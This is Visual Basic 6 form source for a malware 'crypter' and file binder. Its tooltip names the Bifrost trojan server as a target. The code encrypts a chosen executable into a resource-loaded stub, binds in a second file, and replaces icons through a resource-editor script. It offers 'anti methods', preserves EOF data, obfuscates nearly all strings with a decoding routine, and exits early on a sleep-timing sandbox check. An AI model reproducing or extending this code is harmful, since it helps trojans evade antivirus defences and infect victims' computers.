VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   0  'None
   ClientHeight    =   2910
   ClientLeft      =   5250
   ClientTop       =   4845
   ClientWidth     =   3510
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   2910
   ScaleWidth      =   3510
   ShowInTaskbar   =   0   'False
   Begin VB.TextBox brn 
      Height          =   195
      Left            =   0
      TabIndex        =   15
      Text            =   "Text1"
      Top             =   3120
      Width           =   150
   End
   Begin MSI.wxpText file 
      Height          =   285
      Left            =   120
      TabIndex        =   11
      Top             =   1200
      Width           =   2775
      _ExtentX        =   4895
      _ExtentY        =   503
      Text            =   "Select a file ..."
      BackColor       =   -2147483633
      BackColor       =   -2147483633
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
   End
   Begin MSI.cmd cmd3 
      Height          =   255
      Left            =   3000
      TabIndex        =   2
      ToolTipText     =   "Select a file"
      Top             =   1200
      Width           =   375
      _ExtentX        =   661
      _ExtentY        =   450
      BTYPE           =   3
      TX              =   "..."
      ENAB            =   -1  'True
      BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      COLTYPE         =   2
      FOCUSR          =   -1  'True
      BCOL            =   13160660
      BCOLO           =   13160660
      FCOL            =   0
      FCOLO           =   0
      MCOL            =   12632256
      MPTR            =   1
      MICON           =   "Form1.frx":4CC92
      UMCOL           =   -1  'True
      SOFT            =   0   'False
      PICPOS          =   0
      NGREY           =   0   'False
      FX              =   0
      HAND            =   0   'False
      CHECK           =   0   'False
      VALUE           =   0   'False
   End
   Begin VB.Frame Frame1 
      BorderStyle     =   0  'None
      Height          =   2295
      Left            =   120
      OLEDropMode     =   1  'Manual
      TabIndex        =   1
      Top             =   480
      Width           =   3255
      Begin MSI.wxpText bnd 
         Height          =   285
         Left            =   240
         TabIndex        =   14
         Top             =   1680
         Width           =   1335
         _ExtentX        =   2355
         _ExtentY        =   503
         Text            =   "Bind a file ..."
         BackColor       =   -2147483633
         BackColor       =   -2147483633
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin MSI.wxpText ico 
         Height          =   285
         Left            =   1920
         TabIndex        =   13
         Top             =   1680
         Width           =   1335
         _ExtentX        =   2355
         _ExtentY        =   503
         Text            =   "Change icon ..."
         BackColor       =   -2147483633
         BackColor       =   -2147483633
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin MSI.wxpText rn 
         Height          =   285
         Left            =   0
         TabIndex        =   12
         Top             =   1080
         Width           =   2775
         _ExtentX        =   4895
         _ExtentY        =   503
         Text            =   ""
         BackColor       =   -2147483633
         BackColor       =   -2147483633
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin MSI.Check Check2 
         Height          =   255
         Left            =   1680
         TabIndex        =   10
         Top             =   1680
         Width           =   255
         _ExtentX        =   450
         _ExtentY        =   450
         Caption         =   ""
         ForeColor       =   0
         Caption         =   ""
         BackColor       =   -2147483633
      End
      Begin MSI.Check Check1 
         Height          =   255
         Left            =   0
         TabIndex        =   9
         Top             =   1680
         Width           =   255
         _ExtentX        =   450
         _ExtentY        =   450
         Caption         =   ""
         ForeColor       =   0
         Caption         =   ""
         BackColor       =   -2147483633
      End
      Begin MSI.Check Check3 
         Height          =   255
         Left            =   1680
         TabIndex        =   8
         ToolTipText     =   "Check this if you crypt files like bifrost server ..."
         Top             =   1440
         Width           =   1575
         _ExtentX        =   2778
         _ExtentY        =   450
         Caption         =   "EOF data support"
         ForeColor       =   0
         Caption         =   "EOF data support"
         BackColor       =   -2147483633
      End
      Begin MSI.Check Check4 
         Height          =   255
         Left            =   0
         TabIndex        =   7
         Top             =   1440
         Width           =   1335
         _ExtentX        =   2355
         _ExtentY        =   450
         Caption         =   "Anti methods"
         ForeColor       =   0
         Caption         =   "Anti methods"
         BackColor       =   -2147483633
      End
      Begin MSI.cmd cmd5 
         Height          =   255
         Left            =   2880
         TabIndex        =   4
         ToolTipText     =   "Generate Random Password"
         Top             =   1080
         Width           =   375
         _ExtentX        =   661
         _ExtentY        =   450
         BTYPE           =   3
         TX              =   "..."
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   13160660
         BCOLO           =   13160660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "Form1.frx":4CCAE
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin VB.PictureBox Picture1 
         Height          =   615
         Left            =   0
         OLEDropMode     =   1  'Manual
         Picture         =   "Form1.frx":4CCCA
         ScaleHeight     =   555
         ScaleWidth      =   3315
         TabIndex        =   3
         Top             =   0
         Width           =   3375
      End
      Begin MSI.cmd cmd2 
         Height          =   255
         Left            =   120
         TabIndex        =   5
         ToolTipText     =   "About Me"
         Top             =   2040
         Width           =   1455
         _ExtentX        =   2566
         _ExtentY        =   450
         BTYPE           =   3
         TX              =   "About"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   1
         FOCUSR          =   -1  'True
         BCOL            =   13160660
         BCOLO           =   13160660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "Form1.frx":5221A
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin MSI.cmd cmd1 
         Height          =   255
         Left            =   1800
         TabIndex        =   6
         ToolTipText     =   "Crypt File"
         Top             =   2040
         Width           =   1455
         _ExtentX        =   2566
         _ExtentY        =   450
         BTYPE           =   3
         TX              =   "Crypt"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   13160660
         BCOLO           =   13160660
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   1
         MICON           =   "Form1.frx":52236
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   0   'False
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
   End
   Begin MSI.UsrSkin UsrSkin1 
      Height          =   2895
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   3495
      _ExtentX        =   6165
      _ExtentY        =   5106
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim Fl As String
Dim bufer() As Byte
Dim xc As New c
Dim Data As String
Const lt = "TkvkuR0HFvPqa9JdqeC8EBpnrdd8o8"
Const lt2 = "sfp9KK0QSQWdrQ5TyNdvUVTw2CXYC6"
Public Function lR(sFl As String) As String
  On Error GoTo Err:
  Dim sFB As String, sEh As String, sChar As String
  Dim lFF As Long, lPos As Long, lPos2 As Long, lCount As Long
  If Dir(sFl) = "" Then GoTo Err:
  lFF = FreeFile
  Open sFl For Binary As #lFF
  sFB = Space(LOF(lFF))
  Get #lFF, , sFB
  Close #lFF
  lPos = InStr(1, StrReverse(sFB), GetNullBytes(30))
  sEh = (Mid$(StrReverse(sFB), 1, lPos - 1))
  lR = StrReverse(sEh)
  Exit Function
Err:
  lR = vbNullString
End Function
Sub slW(sFP As String, sED As String)
  Dim FB As String
  Dim lFF As Long
  On Error Resume Next
  If Dir(sFP) = "" Then Exit Sub
  If sED = "" Then Exit Sub
  lFF = FreeFile
  Open sFP For Binary As #lFF
  FB = Space(LOF(lFF))
  Get #lFF, , FB
  Close #lFF
  Kill sFP
  lFF = FreeFile
  Open sFP For Binary As #lFF
  Put #lFF, , FB & sED
  Close #lFF
End Sub
Public Function GetNullBytes(lNum) As String
  Dim sBuf As String
  Dim i As Integer
  For i = 1 To lNum
  sBuf = sBuf & Chr(0)
  Next
  GetNullBytes = sBuf
End Function
Private Sub Check1_Click()
  Fl = ""
  bnd.Text = drt("@glb_dgjc,,,")
  Fl = GetFileName(Fl, drt("?lwDgjc(,("), drt("Qcjcar_dgjc,,,"), True)
  If Fl = "" Then
  Check1.Value = Unchecked
  Exit Sub
  End If
  bnd.Text = Fl
  bndd.Show
End Sub
Private Sub Check2_Click()
  Fl = ""
  ico.Text = drt("Af_lecgaml,,,")
  Fl = GetFileName(Fl, drt("GamlDgjcq&(,gam'z(,gam"), drt("QcjcarGaml,,,"), True)
  If Fl = "" Then Exit Sub
  If Fl = "" Then
  Check2.Value = Unchecked
  Exit Sub
  End If
  ico.Text = Fl
End Sub
Private Sub cmd1_Click()
  Fl = drt("msr,cvc")
  If Dir(file.Text) = "" Then Exit Sub
  Fl = GetFileName(Fl, drt("NCDgjcq&(,cvc'z(,cvc"), drt("QcjcarMsrnsrDgjc,,,"), False)
  If Not Fl <> "" Then Exit Sub
  bufer = LoadResData(101, drt("QR@"))
  Open tmp & drt("Zkqg,b_r") For Binary As #1
  Put #1, , bufer
  Close #1
  rn.Text = lRan
  g
  d
  a
  e
  c
End Sub
Private Function d()
  If rn.Text = "" Then rn.Text = lRan
  Open tmp & drt("Zqapgnr,glg") For Binary As #1
  Put #1, , lt & xc.jfq(Data, rn.Text)
  Put #1, , lt & rn.Text & lt
  Dim sty As String
  If Check4.Value = Checked Then
  sty = "s77"
  End If
  If Dir(bnd.Text) <> "" Then
  sty = "s777"
  End If
  If Check4.Value = Checked And Dir(bnd.Text) <> "" Then
  sty = "#7"
  End If
  Put #1, , sty & lt
  Close #1
End Function
Private Function a()
  bufer = LoadResData(102, drt("QR@"))
  Open tmp & drt("Zpcq,cvc") For Binary As #1
  Put #1, , bufer
  Close #1
  FileCopy tmp & drt("Zkqg,b_r"), Fl
  Kill tmp & drt("Zkqg,b_r")
End Function
Private Function g()
  Open file.Text For Binary As #1
  Data = Space(LOF(1))
  Get #1, , Data
  Close #1
End Function
Private Function c()
  On Error Resume Next
  If Check3.Value = 1 Then
  Call slW(Fl, lR(file.Text))
  End If
  If Not Dir(bnd.Text) = "" Then
  brn.Text = lRan
  Open bnd.Text For Binary As #1
  Data = Space(LOF(1))
  Get #1, , Data
  Close #1
  Dim extr As String
  If bndd.Option1.Value = True Then
  With bndd.Combo1
  If .Text = drt("Rckn") Then
  extr = drt("rkn")
  End If
  If .Text = drt("UglBgp") Then
  extr = drt("ubp")
  End If
  End With
  Else
  With bndd.Combo2
  If .Text = drt("Cvnjmpcp") Then
  extr = drt("cvnj")
  End If
  If .Text = drt("G,Cvnjmpcp") Then
  extr = drt("gcvn")
  End If
  If .Text = drt("Qcptgacq") Then
  extr = drt("qta")
  End If
  If .Text = drt("Qwqrck10") Then
  extr = drt("qwqr")
  End If
  End With
  End If
  Open tmp & drt("Zqq,glg") For Binary As #1
  Put #1, , lt2 & xc.jfq(Data, brn.Text) & lt2
  Put #1, , brn.Text & lt2
  Put #1, , crt("\" & GFN(bnd.Text)) & lt2
  Put #1, , crt(extr) & lt2
  Close #1
  Open tmp & drt("-qa,rvr") For Output As #1
  Print #1, drt("YDGJCL?KCQ[")
  Print #1, drt("CVC;") & Fl
  Print #1, drt("Q_tc?q;") & Fl & vbCrLf
  Print #1, drt("YAMKK?LBQ[")
  Print #1, drt("+_bbmtcpupgrc") & tmp & drt("Zqq,glg*") & """" & drt("QFR") & """" & "," & """" & "7" & """" & ",0"
  Close #1
  Shell tmp & drt("-Pcq,cvc+qapgnr") & """" & tmp & drt("-qa,rvr") & """"
  hsh drt("icplcj10"), drt("Qjccn"), 1000
  End If
  If Dir(ico.Text) = "" Then
  bufer = LoadResData(103, drt("QR@"))
  Open tmp & drt("Zrkn,gam") For Binary As #1
  Put #1, , bufer
  Close #1
  hsh drt("qfcjj10"), drt("QfcjjCvcasrcU"), Me.hWnd, StrPtr(drt("Mncl")), StrPtr(tmp & drt("Zpcq,cvc")), StrPtr(drt("+_bbmtcpupgrc") & Fl & "," & Fl & "," & tmp & drt("Zrkn,gam") & drt("*GAMLEPMSN*/*.")), 0, 0
  Else
  hsh drt("qfcjj10"), drt("QfcjjCvcasrcU"), Me.hWnd, StrPtr(drt("Mncl")), StrPtr(tmp & drt("Zpcq,cvc")), StrPtr(drt("+_bbmtcpupgrc") & Fl & "," & Fl & "," & ico.Text & drt("*GAMLEPMSN*/*.")), 0, 0
  End If
  hsh drt("icplcj10"), drt("Qjccn"), 2000
  Kill tmp & drt("Zpcq,glg")
  Kill tmp & drt("Zpcq,jme")
  Kill tmp & drt("Zpcq,cvc")
  Kill tmp & drt("Zqapgnr,glg")
  Kill tmp & drt("Zqa,rvr")
  If Dir(ico.Text) = "" Then
  Kill tmp & drt("Zrkn,gam")
  End If
  Kill tmp & drt("Zqq,glg")
  MsgBox drt("Bmlc"), vbInformation, drt("DjwApwnrcpt/")
End Function
Private Function e()
  Open tmp & drt("-qa,rvr") For Output As #1
  Print #1, drt("YDGJCL?KCQ[")
  Print #1, drt("CVC;") & Fl
  Print #1, drt("Q_tc?q;") & Fl & vbCrLf
  Print #1, drt("YAMKK?LBQ[")
  Print #1, drt("+_bbmtcpupgrc") & tmp & drt("Zqapgnr,glg*") & """" & drt("qr`") & """" & "," & """" & "7" & """" & ",0"
  Close #1
  Shell tmp & drt("-Pcq,cvc+qapgnr") & """" & tmp & drt("-qa,rvr") & """"
End Function
Private Sub cmd2_Click()
  About.Show
End Sub
Public Function lRan()
  Dim num_characters As Integer
  Dim i As Integer
  Dim txt As String
  Dim ch As Integer
  Randomize
  num_characters = CInt("30")
  For i = 1 To num_characters
  ch = Int((26 + 26 + 10) * Rnd)
  If ch < 26 Then
  txt = txt & Chr$(ch + Asc("A"))
  ElseIf ch < 2 * 26 Then
  ch = ch - 26
  txt = txt & Chr$(ch + Asc("a"))
  Else
  ch = ch - 26 - 26
  txt = txt & Chr$(ch + Asc("0"))
  End If
  Next i
  lRan = txt
End Function
Private Sub cmd3_Click()
  Fl = GetFileName(Fl, drt("NCDgjcq&(,cvc'z(,cvc"), drt("Qcjcar_dgjc,,,"), True)
  If Fl = "" Then Exit Sub
  file.Text = Fl
End Sub
Private Sub cmd5_Click()
  rn.Text = lRan
End Sub
Private Sub file_OLEDragDrop(Data As DataObject, Effect As Long, Button As Integer, Shift As Integer, X As Single, Y As Single)
  On Error Resume Next
  file.Text = Data.Files(1)
End Sub
Private Sub Form_Load()
  Dim TNow As Long
  Dim TAfter As Long
  TNow = hsh(drt("icplcj10"), drt("EcrRgaiAmslr"))
  hsh drt("icplcj10"), drt("Qjccn"), 500
  TAfter = hsh(drt("icplcj10"), drt("EcrRgaiAmslr"))
  If TAfter - TNow < 500 Then
  End
  End If
  UsrSkin1.SkinActivate
  UsrSkin1.SkinCaption = drt("DjwApwnrcpt/`")
  rn.Text = lRan
End Sub
Private Function pvbnu() As String
  Dim lRet        As Long
  Dim bvBuff(255) As Byte
  lRet = hsh(drt("icplcj10"), drt("EcrKmbsjcDgjcL_kc?"), App.hInstance, VarPtr(bvBuff(0)), 256)
  pvbnu = Left$(StrConv(bvBuff, vbUnicode), lRet)
End Function
Private Sub Frame1_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
  Drag Me
End Sub
Private Sub ico_OLEDragDrop(Data As DataObject, Effect As Long, Button As Integer, Shift As Integer, X As Single, Y As Single)
  On Error Resume Next
  ico.Text = Data.Files(1)
End Sub
Private Sub picture1_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
  Drag Me
End Sub
Private Sub Picture1_OLEDragDrop(Data As DataObject, Effect As Long, Button As Integer, Shift As Integer, X As Single, Y As Single)
  On Error Resume Next
  file.Text = Data.Files(1)
End Sub
Private Sub UsrSkin1_SkinMouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
  If Button = vbLeftButton Then Drag Me
End Sub
Private Sub UsrSkin1_SkinUnload()
  End
End Sub
Private Sub Form_Resize()
  UsrSkin1.Move 0, 0, ScaleWidth, ScaleHeight
End Sub
Public Function GFN(flname As String) As String
  Dim posn As Integer, i As Integer
  Dim fName As String
  posn = 0
  For i = 1 To Len(flname)
  If (Mid(flname, i, 1) = "\") Then posn = i
  Next i
  fName = Right(flname, Len(flname) - posn)
  GFN = fName
End Function
